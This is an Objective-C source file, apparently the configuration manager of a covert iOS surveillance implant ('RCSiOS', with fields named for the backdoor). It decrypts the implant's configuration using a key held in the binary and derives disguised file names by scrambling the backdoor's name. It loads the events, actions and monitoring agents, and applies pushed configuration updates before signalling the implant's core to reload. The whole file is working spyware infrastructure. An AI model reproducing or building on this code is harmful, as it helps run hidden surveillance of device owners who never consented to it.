/*
 * RCSiOS - ConfiguraTor(i)
 *  This class will be responsible for all the required operations on the 
 *  configuration file.
 *
 * 
 * Created on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <sys/types.h>
#import <CommonCrypto/CommonDigest.h>

#import "RCSIConfManager.h"
#import "RCSITaskManager.h"
#import "RCSIEncryption.h"
#import "RCSICommon.h"
#import "RCSIUtils.h"
#import "RCSIJSonConfiguration.h"
#import "RCSISharedMemory.h"
#import "RCSIInfoManager.h"

static _i_ConfManager *sharedInstance = nil;

//#define DEBUG_

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation _i_ConfManager

@synthesize mGlobalConfiguration, mBackdoorName, mBackdoorUpdateName, mShouldReloadConfiguration;
@synthesize mConfigTimestamp;

+ (_i_ConfManager *)sharedInstance
{
  @synchronized(self)
  {
  if (sharedInstance == nil)
    {
      [[self alloc] init];
    }
  }
  
  return sharedInstance;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
  if (sharedInstance == nil)
    {
      sharedInstance = [super allocWithZone: aZone];
      return sharedInstance;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  return UINT_MAX;
}

- (oneway void)release
{
  
}

- (id)autorelease
{
  return self;
}

- (id)initWithBackdoorName: (NSString *)aName
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedInstance != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            mConfigTimestamp = 0;
            NSData *temp = [NSData dataWithBytes: gConfAesKey
                                          length: CC_MD5_DIGEST_LENGTH];
            
            mEncryption = [[_i_Encryption alloc] initWithKey: temp];
            
            mBackdoorName = [aName copy];

            mBackdoorUpdateName = [mEncryption scrambleForward: mBackdoorName
                                                          seed: ALPHABET_LEN / 2];

            if ([mBackdoorName intValue] < [mBackdoorUpdateName intValue])
              mConfigurationName = [mEncryption scrambleForward: mBackdoorName
                                                           seed: 1];
            else
              mConfigurationName = [mEncryption scrambleForward: mBackdoorUpdateName
                                                           seed: 1];
          }
      }
  }
  
  return sharedInstance;
}

- (void)dealloc
{
  [mEncryption release];
  [mBackdoorName release];
  
  [super dealloc];
}

- (id)delegate
{
  return mDelegate;
}

- (void)setDelegate: (id)aDelegate
{
  mDelegate = aDelegate;
}

- (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  BOOL bRet = TRUE;
  
  NSData *configData = nil;
  
  configData = [mEncryption decryptJSonConfiguration: configurationFile];
  
  if (configData == nil)
    {
      [pool release];
      return NO;
    }
  
  SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
  
  if ([jSonDel checkConfiguration: configData] == FALSE)
    bRet = FALSE;
  
  [jSonDel release];
  
  [configData release];
  
  [pool release];
  
  return bRet;
}

- (BOOL)checkConfiguration
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = TRUE;

  NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                 [[NSBundle mainBundle] bundlePath],
                                 gConfigurationName];
  
  bRet = [self checkConfigurationIntegrity: configurationFile];
  
  [configurationFile release];
  
  [pool release];
  
  if (bRet == TRUE)
    time(&mConfigTimestamp);
  
  return bRet;
}

- (NSMutableArray*)eventsArrayConfig
{
  NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                 [[NSBundle mainBundle] bundlePath],
                                 gConfigurationName];
  
  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
  
  [configurationFile release];
  
  if (configuration == nil)
      return nil;

  SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
    
  NSMutableArray *events = [[jSonDel getEventsFromConfiguration: configuration] retain];
  
  [jSonDel release];
  [configuration release];
  
  return events;
}

- (NSMutableArray*)actionsArrayConfig
{
  NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                 [[NSBundle mainBundle] bundlePath],
                                 gConfigurationName];
  
  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
  
  [configurationFile release];
  
  if (configuration == nil)
    return nil;
  
  SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
  
  NSMutableArray *actions = [[jSonDel getActionsFromConfiguration: configuration] retain];
  
  [jSonDel release];
  [configuration release];
  
  return actions;
}

- (NSMutableArray*)agentsArrayConfig
{
  NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                 [[NSBundle mainBundle] bundlePath],
                                 gConfigurationName];
  
  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
  
  [configurationFile release];
  
  if (configuration == nil)
    return nil;
  
  SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
  
  NSMutableArray *agents = [[jSonDel getAgentsFromConfiguration: configuration] retain];
  
  [jSonDel release];
  [configuration release];
  
  return agents;
}

- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
{
  NSString *configUpdatePath = [[NSString alloc] initWithFormat: @"%@/%@", 
                                [[NSBundle mainBundle] bundlePath], 
                                gConfigurationUpdateName];
  
  NSString *configurationName = [[NSString alloc] initWithFormat: @"%@/%@", 
                                 [[NSBundle mainBundle] bundlePath], 
                                 gConfigurationName]; 
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: configUpdatePath] == TRUE)
    {
      NSError *err;
    
      if (![[NSFileManager defaultManager] removeItemAtPath: configUpdatePath error: &err])
        {
          [configUpdatePath release];
          [configurationName release];
          return FALSE;
        }
    }
  
  if ([aConfigurationData writeToFile: configUpdatePath
                           atomically: YES] == NO)
    {
      [configUpdatePath release];
      [configurationName release];
      return FALSE;
    }
  
  if ([self checkConfigurationIntegrity: configUpdatePath])
    {
      if ([[NSFileManager defaultManager] removeItemAtPath: configurationName
                                                     error: nil])
        {
          if ([[NSFileManager defaultManager] moveItemAtPath: configUpdatePath
                                                      toPath: configurationName
                                                       error: nil])
            {
              mShouldReloadConfiguration = YES;
              time(&mConfigTimestamp);
              [configUpdatePath release];
              [configurationName release];
              return TRUE;
            }
        }
    }
  else
    {
      [[NSFileManager defaultManager] removeItemAtPath: configUpdatePath
                                                 error: nil];
    
      createInfoLog(@"Invalid new configuration, reverting");
    }
  
  [configUpdatePath release];
  [configurationName release];
  
  return FALSE;
}

- (void)sendReloadNotification
{
  shMemoryLog reload;
  reload.agentID  = CORE_NOTIFICATION;
  reload.flag     = CORE_NEED_RESTART;
  
  NSData *msgData = [[NSData alloc] initWithBytes: &reload length:sizeof(shMemoryLog)];
  
  [_i_SharedMemory sendMessageToCoreMachPort: msgData withMode: @"kRunLoopEventManagerMode"];
  
  [msgData release];
  
}


- (_i_Encryption *)encryption
{
  return mEncryption;
}

- (NSString *)backdoorName
{
  return mBackdoorName;
}

- (NSString *)backdoorUpdateName
{
  return mBackdoorUpdateName;
}

@end
